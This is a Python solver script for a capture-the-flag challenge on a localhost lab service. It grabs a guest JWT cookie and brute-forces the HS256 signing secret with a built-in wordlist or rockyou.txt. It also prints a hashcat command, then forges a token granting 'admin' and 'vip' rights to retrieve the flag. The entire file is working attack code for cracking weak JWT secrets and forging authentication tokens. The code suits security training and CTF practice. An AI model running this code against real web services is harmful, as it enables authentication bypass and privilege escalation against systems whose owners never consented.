#!/usr/bin/env python3
"""
Solve: VIP Access (hardened) — JWT weak-secret crack then forge
===============================================================
Challenge recap
---------------
The upgraded challenge issues a proper HS256-signed JWT instead of a bare
base64 JSON cookie.  The secret ("football") is short and in rockyou.txt,
so it can be cracked offline.  Once cracked, we sign a new token with
role: "vip" and hit the endpoint.

This solver demonstrates two approaches:

  Mode A — pure Python brute-force (no hashcat/john dependency)
            Tries a small built-in wordlist first, then falls back to
            rockyou.txt if it exists on disk.

  Mode B — hashcat command-line (faster for full rockyou.txt)
            We auto-generate the hashcat invocation string so the player
            can run it themselves if the Python brute-force is too slow.

After cracking, both modes converge on the same forge-and-submit step.

Attack plan
-----------
1. Visit the target, grab the vip_token cookie.
2. Decode the JWT header + payload (no secret needed — base64 only).
3. Crack the HMAC-SHA256 signature against a wordlist.
4. Re-sign a modified payload  {"username":"admin","role":"vip",...}
   with the cracked secret.
5. Send the forged token as the vip_token cookie → read the flag.
"""

import base64
import hashlib
import hmac
import json
import os
import re
import sys
import time
import requests

# ── config ────────────────────────────────────────────────────────────────────
TARGET       = "http://localhost:8003"    # adjust port as needed
ROCKYOU_PATH = "/usr/share/wordlists/rockyou.txt"   # standard Kali path
FLAG_RE      = re.compile(r"INFODAYS\{[^}]+\}")

# A small built-in wordlist that covers football + similar short secrets
# (enough to solve the challenge without needing rockyou.txt installed)
BUILTIN_WORDLIST = [
    "football", "soccer", "password", "password123", "secret", "admin",
    "letmein", "qwerty", "123456", "welcome", "monkey", "dragon",
    "master", "sunshine", "princess", "shadow", "superman", "michael",
    "liverpool", "chelsea", "arsenal", "madrid", "barcelona", "brazil",
    "morocco", "agadir", "infodays", "ctf2030", "fifa2030", "worldcup",
    "referee", "stadium", "champion", "winner", "goals", "penalty",
    # common JWT demo secrets seen in CTF challenges
    "your-256-bit-secret", "supersecret", "jwt_secret", "change_me",
    "hackme", "test", "dev", "1234", "12345", "123456789",
]


# ── JWT helpers (stdlib only, no PyJWT needed) ────────────────────────────────

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(s: str) -> bytes:
    # Add padding
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def jwt_sign(header_b64: str, payload_b64: str, secret: str) -> str:
    """Return the base64url-encoded HMAC-SHA256 signature."""
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return b64url_encode(sig)

def jwt_verify(token: str, secret: str) -> bool:
    """Return True if the token's signature matches the given secret."""
    parts = token.split(".")
    if len(parts) != 3:
        return False
    header_b64, payload_b64, sig_b64 = parts
    expected = jwt_sign(header_b64, payload_b64, secret)
    return hmac.compare_digest(expected, sig_b64)

def jwt_decode_payload(token: str) -> dict:
    parts = token.split(".")
    raw = b64url_decode(parts[1])
    return json.loads(raw)

def jwt_forge(original_token: str, secret: str, overrides: dict) -> str:
    """
    Forge a new JWT using the same header algorithm but with modified
    payload fields supplied via *overrides*.
    """
    parts = original_token.split(".")
    header_b64 = parts[0]
    payload    = jwt_decode_payload(original_token)
    payload.update(overrides)
    # Push expiry far out so we don't race the clock
    payload["exp"] = int(time.time()) + 86400
    new_payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    new_sig         = jwt_sign(header_b64, new_payload_b64, secret)
    return f"{header_b64}.{new_payload_b64}.{new_sig}"


# ── step 1: grab the guest token ─────────────────────────────────────────────

def get_guest_token() -> str:
    print("[*] Requesting guest token from target …")
    r = requests.get(TARGET, timeout=10)
    token = r.cookies.get("vip_token")
    if not token:
        print("[-] No vip_token cookie returned — is the server up?")
        sys.exit(1)
    payload = jwt_decode_payload(token)
    print(f"    Token received.")
    print(f"    Decoded payload: {json.dumps(payload, indent=4)}")
    return token


# ── step 2: crack the secret ──────────────────────────────────────────────────

def crack_secret(token: str) -> str | None:
    """Try the built-in list first, then rockyou.txt if available."""

    print("\n[*] Attempting brute-force with built-in wordlist …")
    for word in BUILTIN_WORDLIST:
        if jwt_verify(token, word):
            return word

    if not os.path.exists(ROCKYOU_PATH):
        print(f"    rockyou.txt not found at {ROCKYOU_PATH}")
        print("    Install with: sudo apt install wordlists && sudo gunzip /usr/share/wordlists/rockyou.txt.gz")
        print_hashcat_hint(token)
        return None

    print(f"[*] Built-in list exhausted. Trying rockyou.txt ({ROCKYOU_PATH}) …")
    print("    (This may take a few seconds …)")
    start  = time.time()
    tested = 0
    try:
        with open(ROCKYOU_PATH, "r", encoding="latin-1") as fh:
            for line in fh:
                word = line.rstrip("\n")
                tested += 1
                if jwt_verify(token, word):
                    elapsed = time.time() - start
                    print(f"    Tested {tested:,} passwords in {elapsed:.1f}s")
                    return word
                if tested % 500_000 == 0:
                    print(f"    … {tested:,} passwords tried …")
    except Exception as e:
        print(f"[-] Error reading rockyou.txt: {e}")

    return None


def print_hashcat_hint(token: str):
    """Print the hashcat one-liner for the player to run themselves."""
    print("\n[i] You can crack it with hashcat instead:")
    print(f'    echo \'{token}\' > /tmp/jwt.txt')
    print(f'    hashcat -a 0 -m 16500 /tmp/jwt.txt {ROCKYOU_PATH}')
    print("    Then re-run this script with --secret <cracked_secret>")


# ── step 3: forge + submit ────────────────────────────────────────────────────

def submit_forged_token(original_token: str, secret: str) -> str | None:
    forged = jwt_forge(original_token, secret, {"username": "admin", "role": "vip"})
    print(f"\n[+] Forged token (first 80 chars): {forged[:80]}…")

    # Verify locally before sending (sanity check)
    assert jwt_verify(forged, secret), "Self-verification failed — bug in forge logic"
    print("[✓] Local signature verification passed.")

    r = requests.get(TARGET, cookies={"vip_token": forged}, timeout=10)
    m = FLAG_RE.search(r.text)
    return m.group() if m else None


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    print("=" * 60)
    print(" VIP Access (hardened) — JWT crack + forge solver")
    print("=" * 60)

    # Allow passing the cracked secret directly: python solve.py --secret football
    preset_secret = None
    if "--secret" in sys.argv:
        idx = sys.argv.index("--secret")
        if idx + 1 < len(sys.argv):
            preset_secret = sys.argv[idx + 1]

    token = get_guest_token()

    if preset_secret:
        secret = preset_secret
        print(f"\n[*] Using supplied secret: '{secret}'")
        if not jwt_verify(token, secret):
            print("[-] Supplied secret does not verify against the token — double-check it.")
            sys.exit(1)
        print("[✓] Supplied secret verified against token signature.")
    else:
        secret = crack_secret(token)
        if not secret:
            print("\n[-] Could not crack the secret automatically.")
            print("    Use hashcat (hint above) then rerun with --secret <value>")
            sys.exit(1)

    print(f"\n[+] Secret cracked: '{secret}'")

    flag = submit_forged_token(token, secret)

    if flag:
        print(f"\n{'='*60}")
        print(f"  FLAG: {flag}")
        print(f"{'='*60}\n")
    else:
        print("\n[-] Flag not found in response.")
        print("    The server may check additional fields — inspect the response manually.")


if __name__ == "__main__":
    main()
